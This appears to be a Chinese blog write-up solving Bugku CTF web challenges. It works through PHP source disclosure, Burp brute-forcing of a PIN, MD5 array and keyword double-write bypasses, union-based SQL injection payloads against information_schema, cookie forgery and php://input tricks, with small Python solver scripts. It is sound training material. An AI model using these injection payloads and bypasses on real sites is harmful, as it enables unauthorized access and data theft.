<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
<p>这个刚才页面显示的base64加密的密文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>我们将其解密得到以下内容，可以看到flag就在其中，复制提交即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526132744362.png" alt="image-20200526132744362"></p>
<p>查看原始页面，可以看到底下说输入5位数密码查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134606784.png" alt="image-20200526134606784"></p>
<p>因为是输入密码的，我们直接来爆破试试，先试用burp抓包，发送的Intruder模块进行爆破</p>
<p>先Clear$在Add$然后选中Payload子模块进行输入爆破数据</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134751450.png" alt="image-20200526134751450"></p>
<p>将Payload type改为Number类型，因为是5位数所以从10000开始，先到20000看看能否爆破出来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134847802.png" alt="image-20200526134847802"></p>
<p>点击start attack进行攻击，发现成功爆破。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135012691.png" alt="image-20200526135012691"></p>
<p>将密码输入，然后返回了flag，进行提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135042949.png" alt="image-20200526135042949"></p>
<h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191544649.png" alt="image-20200607191544649"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191628844.png" alt="image-20200607191628844"></p>
<p>点击一下曲奇饼，发现数字变成了1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191716508.png" alt="image-20200607191716508"></p>
<p>按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191828227.png" alt="image-20200607191828227"></p>
<p>可以看到是以POST传输的，发现了clicks变量，当它为1000000应该能得到flag</p>
<p>就在POST中输入clicks=1000000</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192020389.png" alt="image-20200607192020389"></p>
<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140001555.png" alt="image-20200526140001555"></p>
<p>查看原始页面</p>
<p>可以看到是MD5加密的，我们进行解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140020472.png" alt="image-20200526140020472"></p>
<p>解密返回是空密码，说明不正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140052804.png" alt="image-20200526140052804"></p>
<p>他题目是备份，我们使用御剑来进行扫描一下</p>
<p>有一个.bak后缀的网址，双击打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140130590.png" alt="image-20200526140130590"></p>
<p>得到了一下代码</p>
<p>乱码不用管因为编码不同，那里是中文字体无碍。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140242138.png" alt="image-20200526140242138"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将$str里的key替换为空字符。</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将字符串解析到变量</span><br><span class="line">parse_str($str);</span><br><span class="line">&#x2F;&#x2F;输出MD5加密的key1、key2</span><br><span class="line">echo md5($key1);</span><br><span class="line">echo md5($key2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 两个值进行判断，如果加密的值相同和未加密的值不同输出flag</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;鍙栧緱flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到其中用到了<code>$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);</code>中的<code>str_replac()</code>函数，按照这串代码得出将$str中得’key’替换为空字符，我们可以使用双写绕过<code>kkeyey</code>下面代码的意思就</p>
<p>这里就可以使用数组绕过</p>
<p>构造payload：<code>?kkeyey1[]=1&amp;kkeyey2[]=2</code></p>
<p>复制结果进行提交。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141426607.png" alt="image-20200526141426607"></p>
<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141941730.png" alt="image-20200526141941730"></p>
<p>原始页面，挡在输入框输入1时返回的结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142058592.png" alt="image-20200526142058592"></p>
<p>输入2返回的结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142111653.png" alt="image-20200526142111653"></p>
<p>按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142356183.png" alt="image-20200526142356183"></p>
<p>很明显这是POST注入，name是id</p>
<p>这里可以手注或者使用sqlmap来跑</p>
<p>这里都使用一次，先是手注</p>
<p>我们先进行报错尝试，使用万能单引号看看是否报错</p>
<p>页面没有返回信息说明错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142454610.png" alt="image-20200526142454610"></p>
<p>加上–+试试，发现页面还是错误。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142523435.png" alt="image-20200526142523435"></p>
<p>可能是因为注释符的原因，更改成#试试，果然页面成功返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142556767.png" alt="image-20200526142556767"></p>
<p>使用order by查看字段数当字段等于4的时候返回正常，等于5的时候页面没有返回值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142622712.png" alt="image-20200526142622712"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142648785.png" alt="image-20200526142648785"></p>
<p>union联合查询查看可注入的字段数，要先将id=1‘改为其他的例如：id=-1‘让其报错，不然只会返回正常值，不会显示注入点，当然改成什么都行只要是错误的就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142944623.png" alt="image-20200526142944623"></p>
<p>可以看到，2,3,4这三个都可以注入，查看当前数据库或者查看数据库版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143031514.png" alt="image-20200526143031514"></p>
<p>我们在4的位置上进行注入。</p>
<p>payload：<code>union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;#</code></p>
<p>返回了两个表名<code>fl4g、sc</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143158111.png" alt="image-20200526143158111"></p>
<p>flag肯定在fl4g中，一看就知道，查看fl4g中的字段</p>
<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code></p>
<p>返回了<code>skctf_flag</code>字段名。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143341576.png" alt="image-20200526143341576"></p>
<p>查看字段中的数据</p>
<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(    skctf_flag) from fl4g#</code></p>
<p>成功返回flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143427166.png" alt="image-20200526143427166"></p>
<h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193528166.png" alt="image-20200526193528166"></p>
<p>原始页面。每次刷新页面的值都不同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193605590.png" alt="image-20200526193605590"></p>
<p>他让2秒内计算出那是不可能的，只能上脚本了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 网站</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话保持</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开url</span><br><span class="line">source &#x3D; s.get(url)</span><br><span class="line"></span><br><span class="line">#正则表达式，匹配算术计算source.text意思就是将网页信息存储到text中</span><br><span class="line">s_tr &#x3D; re.search(&#39;(\d+[+\-*])+(\d+)&#39;, source.text).group()</span><br><span class="line"></span><br><span class="line"># 将字符串s_tr当成有效的表达式来求值并返回计算结果</span><br><span class="line">result &#x3D; eval(s_tr)</span><br><span class="line"></span><br><span class="line"># 这里可以理解为设立分界线冒号</span><br><span class="line">post &#x3D; &#123;&#39;value&#39;: result&#125;</span><br><span class="line"></span><br><span class="line"># 以post请求输出文本</span><br><span class="line">print(s.post(url, data &#x3D; post).text)</span><br></pre></td></tr></table></figure>

<p>得到flag，因为是一直变化的，所以有可能运行好几次都不返回值，多运行两次就OK。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526194100263.png" alt="image-20200526194100263"></p>
<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526210947209.png" alt="image-20200526210947209"></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211004806.png" alt="image-20200526211004806"></p>
<p>使用burp进行抓包，这并不是真正地flag，每次刷新都会改变，所以就可以判断他是要在规定时间内算出来，所以就要写一个脚本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211100106.png" alt="image-20200526211100106"></p>
<p>代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 地址</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web6&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话维持</span><br><span class="line">s&#x3D;requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开网址和headers请求头</span><br><span class="line">header &#x3D; s.get(url).headers</span><br><span class="line">print(header)</span><br><span class="line"></span><br><span class="line"># 对其进行base64两次解密</span><br><span class="line"># split() 通过指定分隔符对字符串进行切片</span><br><span class="line"># encode()指定的编码格式编码字符串</span><br><span class="line">flag &#x3D; base64.b64decode(base64.b64decode(header[&#39;flag&#39;]).decode().split(&#39;:&#39;)[1]).decode() </span><br><span class="line"></span><br><span class="line">data&#x3D;&#123;&#39;margin&#39;:flag&#125;</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">print(s.post(url,data).text)</span><br></pre></td></tr></table></figure>

<p>运行得出flag，复制进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211513761.png" alt="image-20200526211513761"></p>
<p>如果感觉太乱了可以吧get(url)下的print注销掉</p>
<p><img src="/2020/07/25/bugku/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200526211612820.png" alt="image-20200526211612820"></p>
<h4 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201414869.png" alt="image-20200526201414869"></p>
<p>查看页面，返回了一堆不知道是啥玩意的字母，但是可以看到URL中有base64的加密密文。复制进行解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201515056.png" alt="image-20200526201515056"></p>
<p>解密之后返回了keys.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201651353.png" alt="image-20200526201651353"></p>
<p>仿照一下之前的格式，尝试一下将index.php进行加密，并且line=1，这是加密后的index.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201847982.png" alt="image-20200526201847982"></p>
<p>复制在页面中更改相对应的值，返回了一个error_reporting(0);(错误报告)，将line改为2试试。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201945215.png" alt="image-20200526201945215"></p>
<p>发现返回代码了，因为每次只能返回一个，所以我们要写一个脚本，让他全部输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202029410.png" alt="image-20200526202029410"></p>
<p>使用py写一个脚本，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 定义一个空字符</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 因为之前够早的line每次更改数字都变，所以这里让其循环20直接全部输出</span><br><span class="line">for i in range(0,20):</span><br><span class="line"></span><br><span class="line">    # 在line处加上for循环的i进行每次变更数字</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(i)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39;</span><br><span class="line"></span><br><span class="line">    # 打开url</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line"></span><br><span class="line">    # 进行输出</span><br><span class="line">    print (s.text)</span><br></pre></td></tr></table></figure>

<p>运行之后得到的结果，可以看到Cookie需要等于margin才能输出，所以需要进行伪造Cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202305592.png" alt="image-20200526202305592"></p>
<p>将页面返回到原始的界面，也就是加密的keys.txt的界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202544258.png" alt="image-20200526202544258"></p>
<p>进行抓包，发送到Repeater模块，在其中伪造Cookie然后GO一下，发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202728983.png" alt="image-20200526202728983"></p>
<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133509908.png" alt="image-20200527133509908"></p>
<p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133633774.png" alt="image-20200527133633774"></p>
<p>F12查看源码，看到有一个1p.html，访问一下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133820886.png" alt="image-20200527133820886"></p>
<p><code>http://123.206.87.240:8006/test/1p.html</code>，访问这个网址发现返回了这个，说明刚才那个网址进行了重定向</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133931990.png" alt="image-20200527133931990"></p>
<p>使用<code>view-source:123.206.87.240:8006/test/1p.html</code>查看1p.html的源代码，看到有URL编码和base64编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527134105206.png" alt="image-20200527134105206"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;</span><br></pre></td></tr></table></figure>

<p>先不管是什么编码，因为当中有 URL编码，直接全部复制，进行URL解码，base64编码因为不是相同编码不会进行编译。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135250644.png" alt="image-20200527135250644"></p>
<p>将base64的的代码复制进行解密，发现又返回了URL编码，复制URL编码再次去URL解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135327828.png" alt="image-20200527135327828"></p>
<p>URL解密之后获得了以下的值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135645667.png" alt="image-20200527135645667"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;</span><br><span class="line"># 判断id是否为空和0</span><br><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line"># 如果id为空，则我们看到URL加上hello.php?id&#x3D;1</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line"># 退出</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line"># 判断a变量中.第一次出现的位置，只有当a没有.的时候才能不执行if里面的语句</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 读取变量a</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line"></span><br><span class="line"># 进行判断，当data等于bugku is a nice plateform!，当id等于0，当b&gt;5，当111等于1114，b的第一个字符不等于4</span><br><span class="line"></span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">--&gt;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>限制 URL 查询字符串中必须有非空非零变量 <code>id</code></li>
<li>限制变量 <code>$a</code> 中不能含有字符 <code>.</code></li>
<li>要满足以下 5 条表达式才会爆 flag： <ul>
<li>变量 <code>$data</code> 弱等于字符串 <code>bugku is a nice plateform!</code></li>
<li>变量 <code>$id</code> 弱等于整型数 0</li>
<li>变量 <code>$b</code> 的长度大于 5</li>
<li>字符串 <code>1114</code> 要与字符串 <code>111</code> 连接变量 <code>$b</code> 的第一个字符构成的正则表达式匹配</li>
<li>变量 <code>$b</code> 的第一个字符弱不等于整型数 4</li>
</ul>
</li>
</ul>
<p>可以看到，代码中已经爆出来了flag文件，所以可以直接访问flag文件。</p>
<p>也可以构造Payload：<code>?id=.&amp;a=php://input&amp;b=.123456</code>,post:<code>data=bugku is a nice plateform!</code></p>
<h5 id="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"><a href="#首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE" class="headerlink" title="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"></a>首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527114619744.png" alt="image-20200527114619744"></p>
<p>先直接访问flag文件，直接复制粘贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140149790.png" alt="image-20200527140149790"></p>
<p>构造的网址，返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140359102.png" alt="image-20200527140359102"></p>
<h4 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180103558.png" alt="image-20200607180103558"></p>
<p>查看原始界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180123318.png" alt="image-20200607180123318"></p>
<p>F12查看一下源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180139956.png" alt="image-20200607180139956"></p>
<p>很显然想让我们利用源码去得到flag。这里我们稍微解释下这个源码的意思。</p>
<p>开始有三个变量：user，file，pass，但是我们发现这里的pass也就是password没有什么用，因为代码里面虽然定义了这个变量但是并没有使用到。所以我们重点关注前两个变量。看下面的条件</p>
<p>（1）<code>if(isset($user))</code>这个isset()函数是判断$user这个变量的是否存在，user变量不能为空</p>
<p>（2）<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code></p>
